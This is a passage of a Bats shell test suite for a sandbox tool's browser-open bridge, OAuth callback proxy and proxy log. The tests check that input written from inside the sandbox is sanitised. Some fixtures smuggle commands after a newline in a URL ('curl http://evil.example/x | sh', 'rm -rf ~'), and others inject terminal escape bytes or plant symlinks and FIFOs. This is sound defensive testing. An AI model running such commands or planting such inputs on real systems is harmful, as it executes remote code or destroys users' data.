  assert_output --partial "github.com/cleatdev/cleat/issues/new"
}

@test "blocked report: says nothing when nothing was blocked" {
  # concept/21 forbids the nag. An empty session must print no line at all.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] opening URL on host url=https://claude.ai/x\n' > "$log"
  run _maybe_report_blocked_opens "$log" 0
  assert_success
  assert_output ""
}

@test "blocked report: only this session, never a previous one" {
  # Without the offset a refusal from an earlier session re-fires on every run.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 09:00:00] %s origin=old.example.com url=https://old.example.com/\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  local off; off="$(wc -c < "$log" | tr -d ' ')"
  run _maybe_report_blocked_opens "$log" "$off"
  assert_output ""
}

@test "blocked report: a forged log line cannot inject terminal control bytes" {
  # The box writes the proxy log. Everything printed from it is box-authored by
  # construction, which is exactly why it is sanitized first.
  local log="$TEST_TEMP/.proxy-log"
  printf '[browser-watcher 10:00:00] %s origin=a.example.com url=https://a.example.com/\033[2Jwiped\n' \
    "$_BROWSER_BLOCKED_MARK" > "$log"
  run _maybe_report_blocked_opens "$log" 0
  refute_output --partial $'\033[2J'
}

# ── stale debounce markers ──────────────────────────────────────────────────

@test "marker sweep: removes expired debounce markers, keeps fresh ones" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  mkdir "$dir/.open.stale_9"
  touch -t 202001010000 "$dir/.open.stale_9"     # long past the 2s window
  mkdir "$dir/.open.fresh_9"                     # now: inside the window
  _browser_sweep_stale_markers "$dir"
  [ ! -d "$dir/.open.stale_9" ] || { echo "expired debounce marker survived the sweep"; return 1; }
  [ -d "$dir/.open.fresh_9" ] || { echo "fresh debounce marker was swept; a live debounce would break"; return 1; }
}

@test "marker sweep: watcher start clears markers a dead session left behind" {
  # A box whose last session never claims another URL keeps its final markers
  # forever (the per-claim sweep never runs again); watcher startup must sweep.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  mkdir "$dir/.open.leftover_3"
  touch -t 202001010000 "$dir/.open.leftover_3"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ ! -d "$dir/.open.leftover_3" ] || { echo "watcher start did not sweep a stale marker"; return 1; }
}

@test "browser bridge: watcher startup keeps a FRESH pending URL (no sibling swallow)" {
  # Concurrent watchers on one box are supported (a login alongside a session,
  # two shells). The startup sweep used to rm the bridge file unconditionally,
  # so a watcher starting moments after claude wrote a login URL swallowed it
  # before any sibling's 0.5s poll could claim it: no tab, no proxy, stranded
  # login. A fresh file must survive startup and get claimed and opened.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  # Retargeted twice over. The fixture is an allowlisted authorize URL because
  # a plain link at example.com is now refused by the destination gate, and
  # host_opens_clicks stays 0 because that is the case the sweep bug hit
  # (`cleat login` passes 0 unconditionally). What the test protects is
  # unchanged: a FRESH pending URL must survive watcher startup and be claimed.
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  _extract_callback_port() { echo "1455"; return 0; }
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 2
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ] || { echo "startup sweep swallowed a fresh pending URL"; return 1; }
  run cat "$TEST_TEMP/opened.log"
  assert_output --partial "claude.ai"
}

@test "browser bridge: auto mode does NOT re-open a plain link the terminal handled" {
  # Integration: drive the real watcher loop with an interactive terminal flag.
  # The plain link must never reach the opener (the visible duplicate tab).
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  # cname="" so the auth branch is skipped (is_auth stays 0); host_opens_clicks=1.
  # The fixture is an ALLOWLISTED plain link, so the deferral is still what
  # stops it rather than the destination gate one step earlier. That keeps the
  # duplicate-tab property this test was written for under test, and the gate's
  # own refusal has its own test above.
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7                                  # let it pass the startup rm -f
  printf '%s' "https://github.com/cleatdev/cleat" > "$dir/.browser-open"
  sleep 2                                    # several poll cycles
  kill -0 "$wpid" 2>/dev/null || { echo "watcher died before the assertion"; return 1; }
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "bridge re-opened a plain link the terminal already opened"; return 1; }
  # The deferral is logged: a silent defer is exactly what made the code-paste
  # login regression hard to diagnose from the field.
  run cat "$dir/.proxy-log"
  assert_output --partial "deferring URL to terminal"
}

@test "browser bridge: auto mode still opens an auth URL on an interactive terminal" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "1455"; return 0; }   # force the auth branch
  # The stub must signal readiness ($4 is the marker the backend touches on a
  # successful bind) and stay alive, or the watcher correctly refuses to open:
  # a proxy that exits without binding means the callback has nowhere to land.
  # That refusal has its own test; this one is about the auth URL still opening.
  _auth_callback_proxy() { [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.log" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ] || { echo "auth URL was not opened by the bridge"; return 1; }
}

@test "browser bridge: off mode opens nothing yet still starts the auth proxy (login works)" {
  # off withholds every browser open, even an auth URL, but the OAuth callback
  # proxy must STILL start so `cleat login` completes when the URL is opened by
  # hand. The proxy is started before the open gate, so it runs in every mode.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "1455"; return 0; }   # force the auth branch
  # $4 is the readiness marker. Without it the watcher defers on "the callback
  # listener never came up" and never reaches the mode decision at all, so the
  # test would pass for the wrong reason.
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; [ -n "${4:-}" ] && : > "$4"; sleep 5; }
  _port_in_use() { return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "off" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/proxy_started" ] && break
    sleep 0.5
  done
  sleep 1                                                # give any (wrong) open a chance to land
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/proxy_started" ] || { echo "off mode did not start the auth proxy; cleat login would hang"; return 1; }
  [ ! -f "$TEST_TEMP/opened.log" ] || { echo "off mode opened a browser; it must suppress every open"; return 1; }
}

# ── Proxy log: the box writes into it, the host owns the file ────────────────
# Every branch of the watcher APPENDS the claimed URL to .proxy-log, and a
# plain `>>` follows a symlink. The clip dir is mounted read-write into the
# box, so an unguarded log path let a caged process write lines of its choosing
# into any file the host user can write.

@test "proxy log: a symlink present at watcher start is dropped too" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'original line\n' > "$TEST_TEMP/rc-target2"
  ln -s "$TEST_TEMP/rc-target2" "$dir/.proxy-log"
  _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ ! -L "$dir/.proxy-log" ] || { echo "planted symlink survived watcher startup"; return 1; }
  run cat "$TEST_TEMP/rc-target2"
  assert_output "original line"
}

@test "proxy log: a URL carrying a newline cannot forge its own log line" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  grep -q 'opening URL' "$dir/.proxy-log" || { echo "watcher never logged the URL"; return 1; }
  # The payload may appear INSIDE the single log line, never as a line of its own.
  run grep -c '^curl http' "$dir/.proxy-log"
  assert_output "0"
}

@test "proxy log: an oversized log is capped at watcher start" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  head -c 1200000 /dev/zero | tr '\0' 'x' > "$dir/.proxy-log"
  _browser_watcher "$dir" "true" "" "auto" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  local sz; sz="$(wc -c < "$dir/.proxy-log" | tr -d '[:space:]')"
  [ "$sz" -lt 1048576 ] || { echo "proxy log was never capped: $sz bytes"; return 1; }
}

# ── Callback proxy gate ──────────────────────────────────────────────────────

@test "callback proxy: a deferred plain link never binds a host port" {
  # The proxy used to start on any URL the parser accepted, so a link the
  # policy DEFERS to the terminal still made the host bind a box-named port
  # with no tab and nothing on screen to explain it.
  #
  # The fixture is an ALLOWLISTED plain link, deliberately. With an unlisted one
  # the destination gate would refuse the proxy first and this test would pass
  # without the is_auth gate existing at all, which is a guard another guard
  # covers and therefore one no mutation can reach. github.com is on the shipped
  # list and carries no redirect_uri, so only is_auth stops the bind.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "5555"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
  _port_in_use() { return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://github.com/cleatdev/cleat" > "$dir/.browser-open"
  sleep 2
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ ! -f "$TEST_TEMP/proxy_started" ] || { echo "a deferred plain link bound a host port"; return 1; }
}

@test "callback proxy: a real authorize URL still starts the proxy" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _extract_callback_port() { echo "5555"; return 0; }
  _auth_callback_proxy() { touch "$TEST_TEMP/proxy_started"; }
  _browser_watcher "$dir" "true" "mybox" "auto" "1" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A5555%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/proxy_started" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/proxy_started" ] || { echo "a loopback authorize URL did not start the proxy"; return 1; }
}

# ── Callback proxy lifetime ──────────────────────────────────────────────────

@test "callback proxy: a TERM takes the backend down and frees the port" {
  # The backend used to run in the FOREGROUND of the proxy subshell, so bash
  # deferred the trap until it exited: an abandoned login kept the loopback
  # port bound past session end and the watcher's own wait never returned.
  mkdir -p "$TEST_TEMP/bin"
  cat > "$TEST_TEMP/bin/socat" <<EOF
#!/usr/bin/env bash
echo "\$\$" > "$TEST_TEMP/socat.pid"
exec sleep 30
EOF
  chmod +x "$TEST_TEMP/bin/socat"
  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45999 mybox "$TEST_TEMP/plog" &
  local ppid=$!
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -s "$TEST_TEMP/socat.pid" ] && break
    sleep 0.3
  done
  [ -s "$TEST_TEMP/socat.pid" ] || { echo "fake backend never started"; kill "$ppid" 2>/dev/null; return 1; }
  local spid; spid="$(cat "$TEST_TEMP/socat.pid")"
  kill -TERM "$ppid" 2>/dev/null || true
  process_exited "$ppid" || { echo "proxy subshell survived TERM"; kill -9 "$ppid" 2>/dev/null; return 1; }
  process_exited "$spid" || { echo "backend was orphaned and still holds the port"; kill -9 "$spid" 2>/dev/null; return 1; }
}

# ── Stale-bridge sweep (shared by startup and every teardown) ────────────────

@test "bridge sweep: removes a stale bridge file" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf '%s' "https://example.com/old" > "$dir/.browser-open"
  touch -t 202001010000 "$dir/.browser-open"
  _browser_sweep_stale_bridge "$dir"
  [ ! -e "$dir/.browser-open" ] || { echo "a stale bridge file survived the sweep"; return 1; }
}

@test "bridge sweep: keeps a fresh bridge file for a sibling session" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A1455%2Fcb" > "$dir/.browser-open"
  _browser_sweep_stale_bridge "$dir"
  [ -f "$dir/.browser-open" ] || { echo "the sweep swallowed a live sibling login URL"; return 1; }
}

@test "bridge sweep: removes a symlink regardless of age" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'keep\n' > "$TEST_TEMP/sweep-target"
  ln -s "$TEST_TEMP/sweep-target" "$dir/.browser-open"
  _browser_sweep_stale_bridge "$dir"
  [ ! -L "$dir/.browser-open" ] || { echo "a planted symlink survived the sweep"; return 1; }
  [ -f "$TEST_TEMP/sweep-target" ] || { echo "the sweep followed the link and removed the target"; return 1; }
}

@test "proxy log: a real log is never dropped, only a symlink is" {
  # Guards against an overbroad fix. Only a SYMLINK may be removed and only an
  # OVERSIZED log capped, so a regular log must survive BOTH watcher start and
  # a claimed URL, carrying its history forward.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'prior session line\n' > "$dir/.proxy-log"
  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf '%s' "https://x.example/a" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    grep -q 'opening URL' "$dir/.proxy-log" 2>/dev/null && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  run cat "$dir/.proxy-log"
  assert_output --partial "prior session line"
  assert_output --partial "opening URL"
}

@test "callback proxy: a TERM takes the python backend down too" {
  # The python3 branch is backgrounded and waited on exactly like socat. Only
  # the socat branch was pinned, so the python half could regress unseen.
  mkdir -p "$TEST_TEMP/nosocat5"
  local b
  for b in bash date cat sleep; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat5/$b"; done
  cat > "$TEST_TEMP/nosocat5/python3" <<EOF
#!/usr/bin/env bash
cat > /dev/null
echo "\$\$" > "$TEST_TEMP/py.pid"
exec sleep 30
EOF
  chmod +x "$TEST_TEMP/nosocat5/python3"
  PATH="$TEST_TEMP/nosocat5" _auth_callback_proxy 45998 mybox "$TEST_TEMP/plog6" &
  local ppid=$!
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -s "$TEST_TEMP/py.pid" ] && break
    sleep 0.3
  done
  [ -s "$TEST_TEMP/py.pid" ] || { kill "$ppid" 2>/dev/null; echo "fake python backend never started"; return 1; }
  local pypid; pypid="$(cat "$TEST_TEMP/py.pid")"
  kill -TERM "$ppid" 2>/dev/null || true
  process_exited "$ppid" || { echo "proxy subshell survived TERM"; kill -9 "$ppid" 2>/dev/null; return 1; }
  process_exited "$pypid" || { echo "python backend was orphaned"; kill -9 "$pypid" 2>/dev/null; return 1; }
}

@test "proxy log: a FIFO planted mid-session is dropped and the watcher keeps running" {
  # A FIFO passes both [ -L ] and [ -f ] as false, and `>>` on it blocks until
  # a reader appears, so a box could hang the watcher, and with it teardown.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  rm -f "$dir/.proxy-log"; mkfifo "$dir/.proxy-log"
  printf '%s' "https://x.example/a" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$dir/.proxy-log" ] && [ ! -p "$dir/.proxy-log" ] && break
    sleep 0.5
  done
  local alive=0; kill -0 "$wpid" 2>/dev/null && alive=1
  kill "$wpid" 2>/dev/null || true
  process_exited "$wpid" || kill -9 "$wpid" 2>/dev/null || true
  [ "$alive" = 1 ] || { echo "watcher died"; return 1; }
  [ ! -p "$dir/.proxy-log" ] || { echo "the FIFO survived, the watcher would have blocked on it"; return 1; }
  run grep -c 'opening URL' "$dir/.proxy-log"
  assert_output "1"
}

@test "browser bridge: the opener never receives a control character" {
  # The log line was sanitised, but the opener still got the raw URL. A URL
  # never legitimately carries a control character, so hand it the clean one.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
printf '%s' "\$1" > "$TEST_TEMP/opened.arg"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  printf 'https://x.example/a\nrm -rf ~' > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.arg" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.arg" ] || { echo "nothing was opened"; return 1; }
  run wc -l < "$TEST_TEMP/opened.arg"
  [ "$(tr -d '[:space:]' <<< "$output")" = "0" ] || { echo "a newline reached the opener"; return 1; }
}
